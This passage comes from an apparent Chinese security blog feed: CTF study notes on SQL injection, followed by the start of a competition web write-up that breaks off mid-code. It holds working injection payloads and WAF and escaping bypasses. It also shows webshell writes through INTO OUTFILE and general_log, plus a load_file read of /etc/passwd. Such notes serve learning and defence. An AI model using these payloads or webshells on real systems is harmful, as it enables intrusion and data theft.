&apos;flag&#123;%&apos;行</div><div class="line"></div><div class="line">策略二：</div><div class="line">select * from user where username=&apos;admin&apos; or substr(password,1,2)=&apos;xx&apos;</div><div class="line"></div><div class="line">策略三：</div><div class="line">select password from user where user=&apos;admin&apos; union select [&apos;a&apos;|&apos;fe&apos;] order by 1;</div><div class="line">经典的order by比较注入，不能使用from，or and也被禁用时</div></pre></td></tr></table></figure><p>补充（for myself）:</p><p>基本上注入点都是where这里，需要注意到有这两种类型，他们做出的反馈也是不一样的</p><ol><li><p>select * from user where 1 or 1/0</p><p>这种where下是要么全选中，要么全不选</p></li><li><p>select * from user where password like ‘N1%’</p><p>这种where下是要么不选中，要么只选中一条</p></li></ol><p>在构造注入的时候，这两种where希望别搞混了</p><h2 id="单引号转义下的注入思路整理"><a href="#单引号转义下的注入思路整理" class="headerlink" title="单引号转义下的注入思路整理"></a>单引号转义下的注入思路整理</h2><p>讲道理在单引号被转义而无法使用下，就基本GG了，但在一些特殊的配置下仍可能实现注入，在做题时也偶尔会碰到这些有意思的场景，把历来的思路做个记录。</p><ul><li><p>宽字节注入<code>%df%2f</code>，通过%df来吃掉\组成一个字符</p></li><li><p>存在切割操作，从对转义后的字符串中切割出一个<strong>真正的<code>\</code></strong>，使用这个反斜杠来转义最后一个单引号，适用于两个可控注入点的情况<code>select * from user where id=&#39;$_GET[&#39;id&#39;] and username=&#39;$_GET[&#39;username&#39;]&#39;</code>，在后一个可控点进行注入</p></li><li><p>只转义了单引号，可以通过添加一个\来转义转义单引号的反斜杠，将单引号解放出来</p></li><li><p>像国赛里的一道题目样自己作死，在转义后又将单引号去掉，导致又出现了和第二条一样的一个<strong>真正的<code>\</code></strong>，然后与第二条同样的用法</p></li><li><p>转义可能仍有疏漏，比如对get,post转义，但参数用的request[‘id’]，这个是没有转义的</p></li><li><p>也许只是虚晃一枪呢？的确转义的天衣无缝，但我们找到了一个数值型的注入点，并不需要单引号:)</p></li><li><p>利用二次注入中数据库存储的最大长度实现截断出一个反斜杠。考虑这样一种情况，二次注入点并没有过滤，但是实际存储中进行了两次转义存储，所以数据库中存的<code>\&#39;</code>，导致二次注入仍然无法利用。我们可以寻找一个二次注入语句有两个参数的点，通过数据库中存储的最大长度实现截断出来一个真正的<code>\</code>，实现引号闭合然后供第二个参数去注入</p></li><li><p>连续两次sprintf调用来实现sql语句的拼接，在第一个位置使用<code>%&#39;</code>，转义后为<code>%\&#39;</code>，在第二次拼接中，<code>%</code>将吃掉<code>\</code>字符，导致单引号逃逸。为了保证格式化参数个数正确，使用<code>%1$&#39;</code>即可。原理参见<a href="https://paper.seebug.org/386/" target="_blank" rel="external">https://paper.seebug.org/386/</a>里面还有一些其他的利用方法</p><p>​</p></li></ul><h2 id="非常规的注入做法"><a href="#非常规的注入做法" class="headerlink" title="非常规的注入做法"></a>非常规的注入做法</h2><p>其实有一些实际情况中，会做出各种各样的有趣限制，可能就导致虽然注入点存在，但并不能靠以往的流程来走了，这些场景处理起来比较有趣，有时也需要一些奇思妙想，故打算整理一下</p><h4 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h4><p>可以使用union，限制了from所以最多只能从本表中拿数据，限制了比较函数截取函数所以无法做字符串截取比较。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'admin'</span> <span class="keyword">union</span> <span class="keyword">select</span> [<span class="string">'a'</span>|<span class="string">'fe'</span>] <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>;</div></pre></td></tr></table></figure><p>通过额外的一行来与要拿的一行进行排序比较，测试出哪一行的值。注意因为对大小写不敏感，所以测试的字符中只包括一套大写字母或小写字母就够了，另外盲注出的结果也无法区分大小写</p><h4 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h4><p>来自于RCTF的login题目，大致情况猜测如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">select password from users where username='$_GET["username"]';</div><div class="line">if($password === $_GET['password'])&#123;</div><div class="line">  login successful;</div><div class="line">&#125;</div><div class="line">已知存在账户：username=p password=p</div><div class="line">限制了username的长度为最多36个字符</div></pre></td></tr></table></figure><p>姿势：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">p'||substr(username,1,1)='a  测试有没有存在用户名为a ad adm admi</div><div class="line"><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'p'</span>||<span class="keyword">substr</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'a'</span>;</div><div class="line"></div><div class="line">其实通过上面的姿势已经可以拿到这个表中的所有数据了：</div><div class="line">p'||substr(password,1,10)='justatestb</div><div class="line">就是在测试表中存在的password密码字段的第十位是b还是其他的</div><div class="line"></div><div class="line">这里有几个问题：</div><div class="line">一是为了保证区分大小写，需要修改payload如下：</div><div class="line">p'||substr(hex(password),1,4)='3131</div><div class="line">二是因为username长度限制为36个字符，所以肯定不能测试有没有a，有没有ad，</div><div class="line">有没有adm这样的做，需要改成这样的方式：测试有没有ad，测试有没有dm，</div><div class="line">测试有没有mi。。这样做可以保证每次测试的password都是我们想要的那一行</div><div class="line">而不是测试有没有i，测试有没有n这种可能会受到其他入12i34影响的。</div></pre></td></tr></table></figure><h4 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h4><p>来自于HCTF的SQLSilencer的显注姿势，情况如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">waf正则为</div><div class="line">/union([\s\S]+)select([\s\S]+)from/i</div><div class="line">也就是限制了union select password from username 这种书写形式</div></pre></td></tr></table></figure><p>显注姿势：</p><p>讲道理应该还有其他的姿势，但是很喜欢出题人的payload——利用变量来做</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">类似于以下形式：</div><div class="line"><span class="keyword">set</span> c = (<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'admin'</span>);</div><div class="line">where id=1 union <span class="keyword">select</span> @c;</div><div class="line"></div><div class="line">集成在一句话中就是：</div><div class="line">where id=1|@c:=(payload) union <span class="keyword">select</span> @c;</div></pre></td></tr></table></figure><h4 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h4><p>来自于SECCON sqlsrf题目的sql部分</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">题目和场景二很相似</div><div class="line">select password from users where username='$_GET["username"]';</div><div class="line">if($password === $_GET['password'])&#123;</div><div class="line">  login successful;</div><div class="line">&#125;</div><div class="line">这里取消了对username的字符长度限制，相应的禁用了字符串截取函数（其实</div><div class="line">只是SQLite没有这些函数2333），另外不同的是，知道username存在admin账户，</div><div class="line">但未知密码，请尝试用盲注得到admin的密码</div></pre></td></tr></table></figure><p>姿势</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">admin' and password like 'xx%' and randomblob(3000000000) and ''='</div><div class="line"><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">'admin'</span> <span class="keyword">and</span> <span class="keyword">password</span> <span class="keyword">like</span> <span class="string">'xx%'</span> <span class="keyword">and</span> randomblob(<span class="number">3000000000</span>) <span class="keyword">and</span> <span class="string">''</span>=<span class="string">''</span>;</div><div class="line"></div><div class="line">payload里没有走之前盲注的流程，因为目的很明确，只是为了拿到当前表中</div><div class="line">admin账户的密码。根据第二个bool运算是否成立的来触发后面的time盲注</div></pre></td></tr></table></figure><h4 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h4><p>来自于N1CTF里的两道sql题目</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">考察<span class="keyword">update</span>注入</div><div class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> points=%s</div></pre></td></tr></table></figure><p>姿势</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">因为是<span class="keyword">update</span>注入，直接将是否成功更改了points作为bool标志即可</div><div class="line"><span class="number">1.</span> <span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> points=<span class="number">1</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">1</span>/<span class="number">0</span></div><div class="line">来限制<span class="keyword">update</span>更新所有行还是一行都不更新</div><div class="line"><span class="number">2.</span> <span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> points=<span class="number">1</span> <span class="keyword">where</span> <span class="keyword">password</span> <span class="keyword">like</span> <span class="string">'N____________'</span></div><div class="line">经典的使用<span class="keyword">like</span>注入来逐位获取</div><div class="line"><span class="number">3.</span> <span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> points=<span class="number">1</span> <span class="keyword">where</span> <span class="keyword">substr</span>(<span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'N'</span></div><div class="line">使用<span class="keyword">substr</span>来逐位获取</div><div class="line"><span class="number">4.</span> <span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> points=<span class="number">1111111</span>*<span class="keyword">if</span>(<span class="number">0</span>/<span class="number">1</span>, <span class="number">1</span>,<span class="number">11111111111</span>)</div><div class="line">通过乘法的运算溢出来构造报错注入</div></pre></td></tr></table></figure><h2 id="关于二次注入"><a href="#关于二次注入" class="headerlink" title="关于二次注入"></a>关于二次注入</h2><p>采用mysqli_escape_string(),addslashes()这种转义型的过滤，如果没有其他额外人为操作的话，在这个sql点就是安全，那仍然会保留’这种脏数据，所以要留意会不会在其他sql点造成二次注入</p><p>在qwb中注意到了一个很有意思的点，大致是这样的：</p><ul><li>表中age参数为char类型，但期望存储的是数值型</li><li>在存储中，使用的是insert users(age) values(123)的做法，传入的是个数字，通过mysql的类型转换将数值型转换为字符型存储起来</li></ul><p>那么可能出现的问题如下图所示：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">mysql&gt; create table test1(</div><div class="line">    -&gt; age varchar(100)</div><div class="line">    -&gt; );</div><div class="line">Query OK, 0 rows affected (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; insert test1 values(123);</div><div class="line">Query OK, 1 row affected (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; insert test1 values(0x31);</div><div class="line">Query OK, 1 row affected (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; insert test1 values(0x3127206f7220312d2d20);</div><div class="line">Query OK, 1 row affected (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from test1;</div><div class="line">+------------+</div><div class="line">| age        |</div><div class="line">+------------+</div><div class="line">| 123        |</div><div class="line">| 1          |</div><div class="line">| 1' or 1--  |</div><div class="line">+------------+</div></pre></td></tr></table></figure><p>可以看到成功插入了脏数据，在二次查询的时候如果没有做好防护就会产生二次注入</p><p>相应这里可以采取的防护措施如下：</p><ul><li>既然age列是存储数值型的，数据库中就使用相应的数值型如int，long来存储</li><li>既然将age列用了字符存储，在插入的时候就使用单引号括起来，否则mysql就会做类型转换</li></ul><h2 id="一些零碎记录的点"><a href="#一些零碎记录的点" class="headerlink" title="一些零碎记录的点"></a>一些零碎记录的点</h2><ol><li><p>针对sql注入做的waf防护，常见的有以下几种</p><ul><li>采用mysqli_escape_string(),addslashes()这种转义型的过滤，如果没有其他额外人为操作的话，在这个sql点就是安全，那仍然会保留’这种脏数据，所以要留意会不会在其他sql点造成二次注入</li><li>自己写filter函数，对某些关键字啊，空格啊，符号啊禁用，也是常常产生绕过的地方，比如双写绕过啊，使用其他相同意义的函数啊，空格用%0a代替啊这些。一些比较奇葩的过滤规则可能会引入威胁，就比如国赛帽子的那道题目</li><li>waf函数，如果检测到敏感字符会die掉进程，也是经常进行绕过的地方</li><li>使用PDO结构的sql对象，进行-&gt;perpare预处理之后，那参数就是参数，语句就是语句，基本很难形成注入</li></ul></li><li><p>除了针对各种sql点上过滤的绕过，还有几种情况是值得考虑的</p><ul><li>如果参数其实并没有被过滤呢？就像TCTF上那道题目，全局参数过滤了GET POST ,然而一个参数点使用的是REQUEST[‘username’]来获得的参数，那其实这注入点的参数并没有被过滤</li><li>有些注入点的参数并不是自定义的，但有可能其最终来源还是用户自定义的，而且来源收录的时候只是进行了转义，记录的数据仍然为脏数据，这样这些存储值不经过滤的传到其他注入点做参数就会构成二次注入。（个人感觉二次注入在黑盒审计中出现的场景比代码审计要多，而且经常出现在用户名注册，之后一些操作直接提取用户名去进行sql操作）</li></ul></li><li><p>TCTF里有一道很有意思的注入题目，是关于列名这个参数点注入的，那个题目使用CI框架写的，在$this-&gt;db-&gt;select()-&gt;from()-&gt;where()的select()这个函数里面装的是列名，这个参数在题目中可以由我们自定义，当然做了很多过滤，同时CI框架本身也做了很多过滤，wupco师傅对其进行了仔细分析<a href="http://www.wupco.cn/?p=3646" title="http://www.wupco.cn/?p=3646" target="_blank" rel="external">http://www.wupco.cn/?p=3646</a>，小m师傅当时用了xdebug对运行代码进行了调试，可能也是为了搞清楚CI框架内部做了什么过滤，发现后面加一对’’就没有过滤了。具体的过滤分析找时间再细看，这次先学习下列名注入<br><code>select column_name from test</code>,在column_name可控制下，我们这样写<br><code>select {table_name from information_schema.tables where table_schema=&#39;blog&#39; union select 1} from test</code>这样就可以构造注入了</p></li><li><p>在数据库的登陆用户为root时，有可能是可以在任意目录下写文件的，这样我们就可以写一个webshell出来了<br><code>union select &quot;&lt;?php system($_GET[‘c’]);?&gt;&quot; into outfile &#39;/var/www/html/uploads/shell.php&#39;</code><br>实际情况测试的时候，在wamp中发现报错：<code>The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code>，在sql.ini下将secure-file-priv注释掉就好了<br>在kali的mysql中测试时发现，文件是可以写的，但尝试在/var/www/html/中写文件的时候，显示没有权限，就算是改用root账户登陆也不行，这时其实就是目标文件夹的权限配置问题了，一般网页根目录下的upload/文件是可以写文件进去的。当然前提还得是mysql以root登陆才能有写文件的权限</p></li><li><p>基于语义的waf学习（先占坑有时间加上去）</p></li><li><p>这一条留给自己看，尝试考虑下拿到一个sql点的时候手注的顺序，因为感觉很多sql点加一点过滤就会在测试的时候各种懵逼，还是找个比较好的测试顺序比较好</p><ul><li><code>&#39;</code>有可能没有回显，有报错回显，有waf提示</li><li><code>&#39; or 1</code> <code>&#39; or &#39;&#39;=&#39;</code> 看看有没有全部东西出来，主要是看看这种简单的会不会拦截</li><li><code>&#39; union select 1,2,3,4 %23</code> 看看能不能使用union查询</li><li>还没有信息？尝试下<code>&#39; and sleep(5)--+</code>行不行，如果能的话就说明是可注入的</li><li>到现在还没有？？？尝试各种姿势寻找两种回显吧</li><li>到此为止如果看到了waf信息，报错信息，就可以着手开始搞了。如果还没有东西，可以开始用burp测试一波敏感字符了，基于看到的特殊信息对上面的payload做出替换后再尝试</li><li>如果还没有看到异常情况，那可能点就是封死了，因为能够执行sql的话，上面的结果肯定会有些特殊回显的</li></ul></li><li><p>hctf里遇到了一个比较坑的地方，flag是放在了另一个数据库中，所以一路select database()，然后并没找到奇怪的表，所以在information_schema.tables中使用模糊搜索找找flag关键表<code>select group_concat(table_name) from information_schema.tables where table_name like &#39;%flag%&#39;</code>如果找到了，因为之后要跨数据库去读取表，所以要记得看下表是在哪个数据库里<code>select group_concat(table_schema) from information_schema.tables where table_name = &#39;flag&#39;</code></p></li><li><p>找时间测试了下PDO的工作流程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">  <span class="comment">//首先进行连接，通过new PDO()函数</span></div><div class="line">    $conn = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=localhost;dbname=blog"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</div><div class="line">&#125;<span class="keyword">catch</span>(PDOException $e)&#123;</div><div class="line">    <span class="keyword">die</span>( <span class="string">"Error connecting to SQL Server"</span>.$e-&gt;getMessage() );</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//尝试进行一次普通的查询,这里其实并没有用到PDO的预处理特性，只是普通的查询</span></div><div class="line">$sql = <span class="string">"select * from user where username = '$_GET['id']'"</span>;</div><div class="line">$stmt = $conn-&gt;query($sql);</div><div class="line"><span class="keyword">while</span>(@$row = $stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;</div><div class="line">    var_dump($row);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//使用PDO对sql语句进行预处理再带入查询</span></div><div class="line">$sql = <span class="string">"select * from user where username=?"</span>;</div><div class="line">$stmt = $conn-&gt;prepare($sql);</div><div class="line">$stmt-&gt;bindValue(<span class="number">1</span>,$id);</div><div class="line"><span class="comment">//$arr = array(</span></div><div class="line"><span class="comment">//    ":id" =&gt; $id,</span></div><div class="line"><span class="comment">//);</span></div><div class="line">$stmt-&gt;execute();</div><div class="line">var_dump($stmt);</div><div class="line"><span class="keyword">if</span> (!$stmt)&#123;</div><div class="line">    <span class="keyword">echo</span> $conn-&gt;errorInfo()[<span class="number">2</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line">测试结果：没有使用预处理的sql存在预期的攻击方式，进行预处理后的语句则不存在注入点。</div></pre></td></tr></table></figure></li><li><p>如果以root账户登陆，则可以写文件读文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">"/etc/passwd"</span>)</div><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[cmd]); ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/shell.php'</span></div><div class="line"></div><div class="line">几种写法受变量<span class="keyword">select</span> @@secure_file_priv;控制</div><div class="line">或用<span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure_file_priv%'</span>查询</div><div class="line"></div><div class="line">也可以考虑下面这种写法，通过写日志文件的方式</div><div class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">'on'</span>;</div><div class="line"><span class="keyword">SET</span> <span class="keyword">global</span> general_log_file=<span class="string">'D:/phpStudy/WWW/upload/1.php'</span>;</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'&lt;?php assert($_POST["cmd"]);?&gt;'</span>;</div></pre></td></tr></table></figure></li><li><p>很多题目里，flag并不在当前表中，甚至也不在当前数据库中，我一般采取以下几种方案寻找可疑的flag表</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># 最简单的，直接猜测是flag表的flag字段</div><div class="line">select flag from flag</div><div class="line"></div><div class="line"># 尝试在information_schema.tables中进行like查询可疑表</div><div class="line">select group_concat(table_name) from information_schema.tables where table_name like '%flag or ctf%'</div><div class="line"></div><div class="line"># 自定义的表在输出时会放在后面，所以倒着查询,可以看到所有自定义的表</div><div class="line">select group_concat(table_name) from information_schema.tables</div></pre></td></tr></table></figure><p>​</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前排版还比较乱，常见的姿势基本已经整理的比较全了，还在不断学习中。。。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>全国大学生信息安全竞赛web部分wp</title>
    <link href="https://someonesometimes.github.io/2017/07/11/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%83%A8%E5%88%86wp/"/>
    <id>https://someonesometimes.github.io/2017/07/11/全国大学生信息安全竞赛web部分wp/</id>
    <published>2017-07-11T07:29:44.000Z</published>
    <updated>2017-10-01T16:40:56.106Z</updated>
    
    <content type="html"><![CDATA[<p>比赛好不人性啊，连着24小时，还半夜放题，感觉结束后快猝死了2333。看着其它队伍的表哥嗖嗖的日题也只有喊666的份了，当然对于我这种小白来说重点还是在于赛后的总结学习，嘛，开始吧。</p><a id="more"></a><h2 id="PHP-execise"><a href="#PHP-execise" class="headerlink" title="PHP execise"></a>PHP execise</h2><p>题目给出了php代码的执行环境可以执行任意代码，估计就是<code>&lt;?php eval($_GET[&#39;c&#39;])?&gt;</code>来实现的，出题本意应该是考察选手在禁用函数的情况下拿到flag。所以首先上来要看禁用了那些函数。输入<code>phpinfo();</code>后搜索<code>disable_functions</code>查看禁用函数，可以看到shell命令执行，文件包含等函数都被禁用了，然后下面是就是猜测flag到底藏在了哪里。<br>受以前百度杯的一道题的影响，首先查看了这个php文件的全局变量，测试<code>var_dump($GLOBALS);</code>，没有发现，然后试着<code>var_dump($flag);</code>也没有结果。所以就卡住了。。。果然还是太菜，然而峰回路转，就在我刷新页面的时候，突然给出了目录结构，然后就看到了一个疑似flag的php文件，遂想到flag可能放到其他文件里了，需要目录扫描，刚好前几天做过，于是<code>var_dump(scandir(&#39;./&#39;));</code>一发顺利拿到文件名<br><img src="http://i.imgur.com/Bn7ertd.png" alt=""><br>之后包含文件读取flag就好了<code>require_once(&#39;flag_62cfc2dc115277d0c04ed0f74e48e3e9.php&#39;);echo $flag;</code>成功拿到flag<br><img src="http://i.imgur.com/9oU5VP4.png" alt=""></p><p>相同的思路，通过看学长的wp又学习了其他函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#glob()是一个对文件目录进行搜索并返回匹配正则表达式的函数，所以也可以做文件扫描</span></div><div class="line">glob(<span class="string">'./*'</span>);</div><div class="line"></div><div class="line"><span class="comment">#highlight(__FILE__)是一个可以以高亮显示文本内容的函数，比赛中有时会直接给出php源码一般就是用这个函数来显示的</span></div><div class="line">highlight_file(<span class="string">'./flag_62cfc2dc115277d0c04ed0f74e48e3e9.php'</span>);</div><div class="line"></div><div class="line"><span class="comment">#show_source(__FILE__)也可以用于展示文件的详细情况</span></div></pre></td></tr></table></figure></p><h2 id="wanna-to-see-your-hat"><a href="#wanna-to-see-your-hat" class="headerlink" title="wanna to see your hat?"></a>wanna to see your hat?</h2><p>打开网站看了看，所有的页面都会重定向到route.php这个页面来，然后就是输入用户名显示帽子颜色啥的，输入点简单试了试没有注入思路，然后也看了页面html源码以及http头，也没有发现异常情况，所以考虑是不是代码审计题目，随手扫下目录发现.svn源码泄露，没有用专门的恢复工具，直接在文件中找到了github的地址，访问后分析下的确是比赛题目的环境，下载下来开始代码审计。<br>可以看到$_POST $_GET都经过了转义，这种情况下要么参数从其他地方获取如$_REQUEST,然后是二次注入。ok，我们去找sql点，一共有两个。<br>一个在register页面，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"insert into t_user (username,nickname,password)  values('"</span>.$_POST[<span class="string">'username'</span>].<span class="string">"', '"</span>.$_POST[<span class="string">'nickname'</span>].<span class="string">"','"</span>.md5($_POST[<span class="string">'password'</span>]).<span class="string">"')"</span>;</div><div class="line">  <span class="keyword">if</span> (mysql_query($sql))&#123;</div><div class="line">    header(<span class="string">"Location: ./route.php?act=login"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div></pre></td></tr></table></figure></p><p>就是从过滤后的$_POST中提取参数，所以至少这个点应该是没法用的，最多可能会有二次注入。</p><p>另一个在login界面，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">defined(<span class="string">'black_hat'</span>) <span class="keyword">or</span> header(<span class="string">'Location: route.php?act=login'</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">include_once</span> <span class="string">"common.php"</span>;</div><div class="line">$connect=mysql_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"haozigege"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"there is no ctf!"</span>);</div><div class="line">mysql_select_db(<span class="string">"hats"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"there is no hats!"</span>);</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"name"</span>]))&#123;</div><div class="line">  $name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</div><div class="line">  <span class="keyword">if</span> (strlen($name) &gt; <span class="number">11</span>)&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;alert('name too long')&lt;/script&gt;"</span>);</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</div><div class="line">    <span class="keyword">echo</span> $sql;</div><div class="line">    $result = mysql_query($sql);</div><div class="line">    $row = mysql_fetch_array($result);</div><div class="line">    <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</div><div class="line">      $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</div><div class="line">      <span class="keyword">echo</span> <span class="string">'good job'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</div><div class="line">    &#125;</div><div class="line">    header(<span class="string">"Location: index.php"</span>);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</div><div class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</div><div class="line">    &#125;</div><div class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </div><div class="line">    <span class="keyword">return</span> $value;</div><div 